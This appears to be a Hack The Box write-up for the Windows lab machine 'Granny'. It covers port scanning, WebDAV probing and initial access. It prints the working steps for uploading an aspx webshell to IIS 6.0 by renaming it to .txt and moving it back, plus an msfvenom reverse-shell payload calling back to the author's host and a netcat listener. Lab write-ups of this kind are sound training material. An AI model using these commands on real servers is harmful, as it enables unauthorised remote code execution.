# Hackthebox - Granny - Windows

- [Box on Hackthebox](https://app.hackthebox.com/machines/14)

## Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T4 -sC -sV -O -Pn -p- 10.10.10.15                                                                                                                                                                                         1 ⨯
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 16:13 EDT
Nmap scan report for 10.10.10.15
Host is up (0.031s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Sun, 09 Oct 2022 20:15:23 GMT
|   Server Type: Microsoft-IIS/6.0
|_  WebDAV type: Unknown
|_http-server-header: Microsoft-IIS/6.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows Server 2003 SP2 (89%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP SP3 (88%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (88%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows XP (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.28 seconds
```

## Port 80

### Gobuster

#### Directory busting

```bash
┌──(kali㉿kali)-[~/Documents/granny]
└─$ gobuster dir -u http://10.10.10.15 -w directory-list-2.3-big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /media/sf_kali-shared/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/09 15:58:02 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 149] [--> http://10.10.10.15/images/]
/Images               (Status: 301) [Size: 149] [--> http://10.10.10.15/Images/]
/IMAGES               (Status: 301) [Size: 149] [--> http://10.10.10.15/IMAGES/]
/_private             (Status: 301) [Size: 153] [--> http://10.10.10.15/%5Fprivate/]
```

- The private folder is useless for now
- We can also change our /etc/hosts file and add this list `10.10.10.15     granny.htb`

## Check for known vulnerabilities

### Google fu

- While gobuster is running, let's have a look in Google. IIS 6.0 seems to have a possible code execution vulnerability

### Nmap with vuln script

- Nmap has great scripts including some that will check for know vulnerabilities

```bash
┌──(kali㉿kali)-[~/Documents/granny]
└─$ nmap -sV --script=vuln 10.10.10.15       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 16:37 EDT
Nmap scan report for granny.htb (10.10.10.15)
Host is up (0.026s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-enum: 
|   /_vti_bin/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|   /_vti_bin/shtml.exe: Frontpage file or folder
|_  /images/: Potentially interesting folder
|_http-server-header: Microsoft-IIS/6.0
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
| vulners: 
|   cpe:/a:microsoft:internet_information_server:6.0: 
|       SSV:2903        10.0    https://vulners.com/seebug/SSV:2903     *EXPLOIT*
|       PACKETSTORM:82956       10.0    https://vulners.com/packetstorm/PACKETSTORM:82956       *EXPLOIT*
|       MS01_033        10.0    https://vulners.com/canvas/MS01_033     *EXPLOIT*
|       CVE-2008-0075   10.0    https://vulners.com/cve/CVE-2008-0075
|       CVE-2001-0500   10.0    https://vulners.com/cve/CVE-2001-0500
|       SSV:30067       7.5     https://vulners.com/seebug/SSV:30067    *EXPLOIT*
|       CVE-2007-2897   7.5     https://vulners.com/cve/CVE-2007-2897
|       SSV:2902        7.2     https://vulners.com/seebug/SSV:2902     *EXPLOIT*
|       CVE-2008-0074   7.2     https://vulners.com/cve/CVE-2008-0074
|       CVE-2006-0026   6.5     https://vulners.com/cve/CVE-2006-0026
|       VERACODE:21774  5.0     https://vulners.com/veracode/VERACODE:21774
|       CVE-2005-2678   5.0     https://vulners.com/cve/CVE-2005-2678
|       CVE-2003-0718   5.0     https://vulners.com/cve/CVE-2003-0718
|       VERACODE:20937  4.3     https://vulners.com/veracode/VERACODE:20937
|       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
|       CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
|       CVE-2005-2089   4.3     https://vulners.com/cve/CVE-2005-2089
|       VERACODE:31557  4.0     https://vulners.com/veracode/VERACODE:31557
|       VERACODE:27647  3.5     https://vulners.com/veracode/VERACODE:27647
|_      CVE-2003-1582   2.6     https://vulners.com/cve/CVE-2003-1582
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.43 seconds
```

- The nmap enum is actually better than the wordlist I used with Gobuster. We get a few interesing directories.

### Frontpage extension

- According to our nmap we should be able to login anonymously. It refers us to this [article](https://insecure.org/sploits/Microsoft.frontpage.insecurities.html)
- Googling around we also find [this](https://github.com/deepak0401/Front-Page-Exploit). Let's use burp and temper with the request.
- Using it we can get more info. Our front page user name is "unknown"  
![username](../.res/2022-10-10-07-46-31.png)  
- The server version is `4.0.2.2611`  
![version](../.res/2022-10-10-07-48-12.png)  

### Davtest

- With further research we find this article on [null-byte](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)
- Davtest is able to create a directory and was able to execute html and txt.  
![davtest](../.res/2022-10-10-10-43-11.png)  
- While browsing in the directories disclosed through nmap I saw an asmx file. Let's try to put an an asmx file test there.
- Using cadaver `cadaver http://10.10.10.15/DavTestDir_kbmSbjBY` we can connect and upload files. I get forbidden with aspx and asmx files but txt and html works.
- There is a kali webshell in aspx here `/usr/share/webshells/aspx/cmdasp.aspx`
- Let's try to upload it as txt and then move it (we can move it with davtest move command)
- `cp cmdasp.aspx cmdasp.txt`
- `put cmdasp.txt` It works and we have it on the server  
![cmdasp](../.res/2022-10-10-12-54-24.png)
- `move cmdasp.txt cmdasp.aspx` we move it  
![aspx](../.res/2022-10-10-13-01-10.png)  
- Now that we know we can do this let's make a payload with msfvenom and try to get a reverse shell `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f aspx -o reverse.aspx`.
- We copy our payload to make a txt version `cp reverse.aspx reverse.txt`
- We set a listener `rlwrap nc -lnvp 4444`
- We put the txt file in the server and move it to make it executable by the server  

```bash
dav:/DavTestDir_kbmSbjBY/> put reverse.txt 
Uploading reverse.txt to `/DavTestDir_kbmSbjBY/reverse.txt':
Progress: [=============================>] 100.0% of 2747 bytes succeeded.
dav:/DavTestDir_kbmSbjBY/> move reverse.txt reverse.aspx
Moving `/DavTestDir_kbmSbjBY/reverse.txt' to `/DavTestDir_kbmSbjBY/reverse.aspx':  succeeded.
```

- We browse to http://10.10.10.15/DavTestDir_kbmSbjBY/reverse.aspx and get a shell  
![shell](../.res/2022-10-10-13-13-53.png)
- Our user is "network service"
- Let's check for possible exploi with `systeminfo` we put the result of the command in a file 

[](todo-check-for-exploits-with-win-exp-suggester)

**Coming soon**